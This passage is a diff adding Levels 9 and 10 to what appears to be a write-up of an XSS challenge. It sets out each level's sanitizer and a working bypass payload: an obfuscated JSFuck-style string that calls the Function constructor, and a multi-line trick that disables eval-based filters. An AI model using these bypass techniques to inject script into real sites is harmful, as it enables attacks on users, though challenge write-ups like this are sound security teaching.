@@ -152,3 +152,102 @@ so I used the `ı` character for the `<img>` tag.
 ```
 ![](./images/xss8.png)
 
+# Level 9
+Sanitizer : 
+```javascript
+function sanitize(input) {
+    // no tags, no comments, no string escapes and no new lines
+    const sanitized = input.replace(/[a-z\\]/gi, '').substring(0,140);
+    return "  \x3Cscript\x3E\n  " + sanitized + "\n  \x3C/script\x3E";
+}
+```
+In this level we cannot use `a-z` characters so we only have special characters and characters from other alphabets, you could use JsFuck but there is a 140 character limit for the payload.
+Taking a cue from [this repository](https://gist.github.com/ignis-sec/a89988c3bc473c055c1c5a5228a23fc6) (which uses the same method as JsFuck but with more characters available) , I created a working payload 
+```javascript
+〱=''+{}+[][[]]+!![]+![],ᘘ=〱[5],ᘙ=〱[1],ᘚ=〱[25],ᘲ=〱[6],ᘳ=ᘘ+ᘙ+〱[16]+〱[31]+ᘲ+ᘚ+〱[15]+ᘘ+ᘲ+ᘙ+ᘚ,ᘎ=〱[29]+〱[30]+〱[4]+ᘚ+ᘲ+'(1)',[][ᘳ][ᘳ](ᘎ)()  // 131 characters 
+
+〱=     // '[object Object]undefinedtruefalse'
+''
++{}     // '[object Object]'
++[][[]]  // 'undefined'
++!![]    // 'true'
++![],     // 'false'
+
+//letters that are used more than once defined seperately to shorten payload
+ᘘ=〱[5],    // 'c'      <- "[object Object]undefinedtruefalse"[5]
+ᘙ=〱[1],    // 'o'      <- "[object Object]undefinedtruefalse"[1]
+ᘚ=〱[25],   // 'r'      <- "[object Object]undefinedtruefalse"[25]
+ᘲ=〱[6],    // 't'      <- "[object Object]undefinedtruefalse"[6]
+
+ᘳ=          // 'constructor'
+ᘘ           // 'c'
++ᘙ          // 'o'
++〱[16]     // 'n'
++〱[31]     // 's'
++ᘲ          // 't'
++ᘚ          // 'r'
++〱[15]     // 'u'
++ᘘ          // 'c'
++ᘲ          // 't'
++ᘙ          // 'o'
++ᘚ,          // 'r'
+
+ᘎ=          // 'alert(1)'
+〱[29]      // 'a'
++〱[30]     // 'l'
++〱[4]      // 'e'
++ᘚ          // 'r'
++ᘲ          // 't'
++'(1)',
+
+[][ᘳ][ᘳ](ᘎ)() // []['constructor']['constructor']('alert(1)')() == Function('alert(1)')
+```
+![](./images/xss9.png)
+![](./images/xss10.png)
+
+# Level 10
+Sanitizer : 
+```javascript
+function sanitize(input) {
+    // sanitization!
+    const sanitized = input
+        .replace(/[<>="&%$#\\/]/g, '')
+        .split('\n')
+        .map(row => 'eval(sanitizeAgainAgain(sanitizeAgain("' + row + '")))')
+        .join('\n');
+    return '  \x3Cscript>\n' + sanitized + '\n  \x3C/script>'
+}
+
+var bad = ['<', '>', '&', '%', '$', '#', '[', ']', '|', '{', '}', ';', '\\', '/', ',', '"', '\'', '=', '`', '(', ')'];
+
+function sanitizeAgain(input) {
+    // more sanitization!
+    const sanitized = input.split('').filter(c => !bad.includes(c)).join('');
+    return sanitized;
+}
+
+var regex = /[^A-z.\-]/g
+
+function sanitizeAgainAgain(input) {
+    // even more sanitization!
+    const sanitized = input.replace(regex, '');
+    return sanitized;
+}
+```
+In this layer , we have multiple functions that sanitize the input, but as we can see our input is passed to the eval() function and in all cases `'eval is evil'` \
+Analyzing the source code we notice that a new `eval(sanitizeAgain(sanitizeAgain("' + INPUT + '")` is generated for each line of input, which means that we can simply enter each part of code separated by a newline.\
+`bad` and `regex` are declared variables and the `-` character is not filtered out so we can use it to convert `regex` to `NaN` : `regex--`
+![](./images/xss11.png) 
+We can do the same thing on the length of the `bad` array by removing the characters we are interested in (in this case `()`) 
+![](./images/xss12.png) 
+
+so our final payload will be : 
+```javascript
+regex--
+bad.length--
+bad.length--
+alert(1)
+```
+![](./images/xss13.png) 
+
+# Level Bonus 1 ,2 ,3 
